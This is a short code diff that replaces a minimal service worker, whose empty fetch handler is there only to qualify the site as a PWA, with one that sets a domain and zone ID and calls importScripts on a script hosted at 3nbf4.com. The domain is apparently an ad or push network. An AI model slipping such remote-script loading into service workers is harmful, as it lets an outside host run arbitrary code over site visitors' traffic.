@@ -1,7 +1,6 @@
-self.addEventListener('install', (e) => {
-    self.skipWaiting();
-});
-
-self.addEventListener('fetch', (e) => {
-    // Порожній обробник, щоб браузер засчитав це як PWA
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 10759075
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
